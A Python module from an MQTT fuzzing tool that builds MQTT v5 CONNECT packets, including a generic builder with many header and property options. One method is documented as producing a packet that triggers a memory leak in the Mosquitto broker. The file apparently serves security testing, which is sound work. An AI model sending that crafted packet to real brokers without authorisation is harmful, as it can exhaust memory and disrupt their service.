# Copyright (C) OTARIS INTERACTIVE SERVICES GmbH
# Author: Kathrin Kleinhammer <kleinhammer@otaris.de>
# This program is published under GPLv2 license

from random import randint
from mqtt import  MQTT, MQTTConnect, MQTTWillProperty, MQTTWill, MQTTConnectProperty

class Fuzz_Connect:

    def __init__(self):
        self.proto = "MQTT"
        self.protocolLevel = 5
        self.clientId = "client" + str(randint(100, 1000))
        self.keepAlive = 60

    def connect_std(self):
        "standard valid connect packet"
        clientId="clientstd" + str(randint(100, 1000))
        return MQTT()/MQTTConnect(protoname=self.proto, clientId=clientId)


    def fuzz_will_properties_pkt(self):
        "creates packet which causes a memory leak in mosquitto broker"
        clientId="clientwill" + str(randint(100, 1000))
        pkt = MQTT()/MQTTConnect(protoname=self.proto, clientId=clientId, willflag=True, protolevel=self.protocolLevel)
        pkt.klive = self.keepAlive
        pkt.willproperties = MQTTWill()
        wl = MQTTWillProperty(type=0x18, willdelay=120)
        pkt.willproperties.properties.append(wl)
        pkt.willmsg = "I'm dead"
        pkt.wiltopic = "Dead/Alive"
        return pkt


    def fuzz_connect(self, clientId=None, protoname=None, willtopic=None, willmsg=None, username=None, password=None, protolevel=5, klive=60, usernameflag=0, passwordflag=0, willretainflag=0, willQOSflag=0, willflag=0, cleansess=0, sess_expiry=None, rec_max=None, max_pkt=None, top_alias=None, req_res_info=None, req_prob_info=None, willdelay=None, resp_topic=None, willexpire=None, user_property={"key":None, "value":None}, pkt=None):
        "generate custom CONNECT packet"
        pkt = MQTT()/MQTTConnect()
        if clientId is not None:
            pkt.clientId = clientId
        if protoname is not None:
            pkt.protoname = protoname
        if willtopic is not None:
            pkt.willtopic = willtopic
        if willmsg is not None:
            pkt.willmsg = willmsg
        if username is not None:
            pkt.username = username
        if password is not None:
            pkt.password = password
        pkt.protolevel = self.protocolLevel
        pkt.klive = klive
        pkt.usernameflag = usernameflag
        pkt.passwordflag = passwordflag
        pkt.willretainflag = willretainflag
        pkt.willQOSflag = willQOSflag
        pkt.willflag = willflag
        pkt.cleansess = cleansess
        if willdelay or resp_topic or willexpire:
            pkt.willflag = 1
            pkt.willproperties = MQTTWill()
        if sess_expiry is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x11, sess_expiry=sess_expiry))
        if rec_max is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x21, rec_max=rec_max))
        if max_pkt is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x27, max_pkt=max_pkt))
        if top_alias is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x22, top_alias=top_alias))
        if req_res_info is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x19, req_res_info=req_res_info))
        if req_prob_info is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x17, req_prob_info=req_prob_info))
        if willdelay is not None:
            wl = MQTTWillProperty(type=0x18, willdelay=willdelay)
            pkt.willproperties.properties.append(wl)
        if resp_topic is not None:
            wl = MQTTWillProperty(type=0x08, resp_topic=resp_topic)
            pkt.willproperties.properties.append(wl)
        if willexpire is not None:
            wl = MQTTWillProperty(type=0x02, willexpire=willexpire)
            pkt.willproperties.properties.append(wl)
        if "key" in user_property and "value" in user_property and user_property['key'] is not None and user_property['value'] is not None:
            pkt.properties.append(MQTTConnectProperty(type=0x26, key=user_property['key'], value=user_property['value']))
        return pkt


